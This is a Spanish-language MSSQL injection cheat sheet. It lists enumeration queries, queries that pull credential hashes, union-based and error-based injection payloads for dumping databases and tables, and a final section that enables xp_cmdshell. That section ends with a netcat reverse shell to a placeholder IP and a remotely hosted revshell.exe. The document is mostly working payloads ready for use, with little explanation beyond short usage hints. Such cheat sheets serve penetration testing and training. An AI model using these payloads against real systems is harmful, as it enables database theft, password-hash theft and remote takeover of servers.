# Inyeccion MSSQL 

# Indice
- [Bases de datos por defecto](#Bases-de-datos-por-defecto)
- [Enumeracion basica](#Enumeracion-basica)
  - [Usuario](#Usuario)
  - [Version](#Version)
  - [Hostname](#Hostname)
  - [Nombre de la base de datos](#Nombre-de-la-base-de-datos)
  - [Credenciales](#Credenciales)
  - [Listar las bases de datos](#Listar-las-bases-de-datos)
  - [Listar columnas](Listar-columnas)
  - [Listar tablas](Listar-tablas)
- [Union based](#Union-based)
- [Error based](#Error-based)
- [SQLI to RCE](#SQLI-to-RCE)
    - [xp_cmdshell](#xp_cmdshell)
- [Referencias](#Referencias)

# Bases de datos por defecto
|Name|Description|
|---|---|
|pubs|No disponible en MSSQL 2005|
|model|Disponible en todas las versiones|
|msdb|Disponible en todas las versiones|
|tempdb|Disponible en todas las versiones|
|northwind|Disponible en todas las versiones|
|information_schema|Disponible desde MSSQL 2000 y posteriores|


# Enumeracion basica
## Usuario

```sql
SELECT CURRENT_USER
SELECT user_name();
SELECT system_user;
SELECT user;
```

## Version

```sql
SELECT @@version
```

##  Hostname

```sql
SELECT HOST_NAME()
SELECT @@hostname
SELECT @@SERVERNAME
SELECT SERVERPROPERTY('productversion')
SELECT SERVERPROPERTY('productlevel')
SELECT SERVERPROPERTY('edition');
```

## Nombre de la base de datos

```sql
SELECT DB_NAME()
```

##  Credenciales

- **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`
    
    ```sql
    SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
    ```
    
- **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`
    
    ```sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ```
    

## Listar las bases de datos

```sql
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N); — for N = 0, 1, 2, …
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb   (Only works in MSSQL 2017+)
```

## Listar columnas

```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, column_name FROM information_schema.columns
```

## Listar tablas

```sql
SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, table_name FROM information_schema.columns
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
```

# UNION BASED

Extraer version de la base de datos

````sql
|1 UNION SELECT NULL,@@version,NULL--|
````
Enumerar nombres de las bases de datos (cambiar N por el numero de fila empezando por 1):

````sql
|1 UNION SELECT NULL,DB_NAME(N),NULL--|
|1 UNION SELECT NULL,DB_NAME(1),NULL--|
|1 UNION SELECT NULL,DB_NAME(2),NULL--|
|1 UNION SELECT NULL,DB_NAME(3),NULL--|
````

````sql
|1 UNION SELECT NULL,name,NULL FROM master ..sysdatabases--|
````

Extraer nombre de las tablas
````sql
|1 UNION SELECT NULL,TABLE_NAME,NULL FROM information_schema.TABLES--|
````

````sql
|1 UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype = 'U'--|
````

Extraer nombres de columna (cambiar table1):

````sql
|1 UNION SELECT NULL,column_name,NULL FROM information_schema.COLUMNS-- will extract all columns (regardless of table)|
````

````sql
|1 UNION SELECT TABLE_NAME,column_name,NULL FROM information_schema.COLUMNS-- will line up tables with columns|
````

````sql
|1 UNION SELECT NULL,name,NULL FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'table1')-- will extract columns from a specific table in the current database|
````
Dumpear datos (cambiar column1 y table1):

````sql
|1 UNION SELECT NULL,column1,NULL FROM table1--|
````
Extraer nombres de tablas de otras bases de datos (cambiar other_database por el nombre de la BD)

````sql
|1 UNION SELECT NULL,name,NULL FROM other_database..sysobjects WHERE xtype = 'U'--|
````
Extraer nombres de columnas de otras bases de datos (cambiar other_database y other_table):

````sql
|1 UNION SELECT other_database..syscolumns.name, TYPE_NAME(other_database..syscolumns.xtype),NULL FROM other_database..syscolumns, other_database..sysobjects WHERE other_database..syscolumns.id=other_database..sysobjects.id AND other_database..sysobjects.name='other_table'--|
````
Dumpear datos de otras bases de datos (cabmiar other_database, other_table y other_column):

````sql
|1 UNION SELECT NULL,other_column,NULL FROM other_database..other_table--|
````

# Error Based

CONVERT

- Metodo 1 – Rapido

Extraer version de BD

````sql
|1 AND 1=CONVERT(INT,@@version)--|
````
Extraer numero de bases de datos

````sql
|1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM [master]..[sysdatabases] )+CHAR(58)+CHAR(58)))--|
````
Extraer nombres de las bases de datos (cambiar N por un numero empezando por 1):

````sql
|1 AND 1=CONVERT(INT,db_name(N))--|
````
````sql
|1 AND 1=CONVERT(INT,(SELECT CAST(name AS nvarchar(4000)) FROM master..sysdatabases WHERE dbid=N))--|
````
Extraer el numero de tablas

````sql
|1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM information_schema.TABLES )+CHAR(58)+CHAR(58)))--|
````
Extraer nombre de las tablas (cambiar N por un numero empezando por 1):

````sql
|1 AND 1= CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top N TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--|
|1 AND 1= CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--|
|1 AND 1= CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 2 TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--|
````
Extraer nombre de las columnas (cambiar table1 por el nombre de la tabla):

````sql
|1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top N column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))--|
````
Para dumpear los datos primero debemos contar el numero de entradas de la tabla (cambiar table1 por el nombre de la tabla):

````sql
|1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM table1)+CHAR(58)+CHAR(58)))--|
````
Una vez sabemos el nombre de las columnas dumpeamos los datos incrementando el numero de la fila 

````sql
|1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 column1+CHAR(58)+column2 FROM (SELECT top 1 column1 , column2 FROM table1 ORDER BY column1  ASC) sq ORDER BY column1  DESC)+CHAR(58)+CHAR(58)))--|
|1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 column1+CHAR(58)+column2 FROM (SELECT top 2 column1, column2 FROM table1 ORDER BY column1 ASC) sq ORDER BY column1 DESC)+CHAR(58)+CHAR(58)))--|
|1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 column1+CHAR(58)+column2 FROM (SELECT top 3 column1, column2 FROM table1 ORDER BY column1 ASC) sq ORDER BY column1 DESC)+CHAR(58)+CHAR(58)))--|
````
Extraer tablas de otra base de datos (cambiar other_database e incrementar N):

````sql
|1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top N TABLE_NAME FROM other_database.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--|
',convert(int,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM master.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
',convert(int,(CHAR(58)+(SELECT DISTINCT top 2 TABLE_NAME FROM (SELECT DISTINCT top 2 TABLE_NAME FROM master.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
````
Extraer columnas de otra base de datos (cambiar other_database, other_table e incrementar N):

````sql
|1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top N column_name FROM other_database.information_schema.COLUMNS WHERE TABLE_NAME='other_table' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))--|
````
Ver cuantas entradas hay en la otra base de datos (cambiar other_database y other_table):

````sql
|1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM [other_database]..[other_table] )+CHAR(58)+CHAR(58)))--|
````
Dumpear datos de la otra base de datos (cambiar other_database, other_table, other_column e incrementar N):

````sql
|1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 other_column FROM (SELECT top N other_column FROM other_database..other_table ORDER BY other_column ASC) sq ORDER BY other_column DESC)+CHAR(58)+CHAR(58)))--|
````
Metodo 2 – Lento

Extraer nombres de las bases de datos (cambiar N por un numero empezando por 1):

````sql
|1 AND 1=CONVERT(INT,db_name(N))--|
````
Para enumerar las tablas iremos descartando las ya listadas con `NOT IN`

````sql
|1 AND 1=CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES))--|
|1 AND 1=CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME NOT IN ('table1')))--|
|1 AND 1=CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME NOT IN ('table1', 'table2')))--|
````
De la misma manera enumeraremos las columnas (cambiar table1):

````sql
|1 AND 1=CONVERT(INT,(SELECT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'))--|
|1 AND 1=CONVERT(INT,(SELECT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1' AND column_name NOT IN ('column1')))--|
|1 AND 1=CONVERT(INT,(SELECT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1' AND column_name NOT IN ('column1', 'column2')))--|
````

Dumpeo de datos(cambiar column1 y table1):

````sql
|1 AND 1=CONVERT(INT,(SELECT top 1 column1 FROM table1))--|
|1 AND 1=CONVERT(INT,(SELECT top 1 column1 FROM table1 WHERE column1 NOT IN ('result1')))--|
|1 AND 1=CONVERT(INT,(SELECT top 1 column1 FROM table1 WHERE column1 NOT IN ('result1', 'result2')))--|
````
# SQLI to RCE
## xp_cmdshell

> El comando de MSSQL `xp_cmdshell` permite la ejecucion de comandos de Windows. Normalmente el permiso para ejecutar este comando esta desactivado pero si tenemos acceso a la consola de MSSQL con permisos de administrador podemos activarlo de esta manera:

````sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
````

Una vez activado ya podriamos ejecutar comandos

````sql
xp_cmdshell <comando>

xp_cmdshell \\x.x.x.x\folder\nc.exe -e cmd.exe x.x.x.x 443

xp_cmdshell \\x.x.x.x\folder\revshell.exe
````

# Referencias
- [MSSQL Injection Cheetsheet](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
- [Portswigger Lab SQL Injection Cheetsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
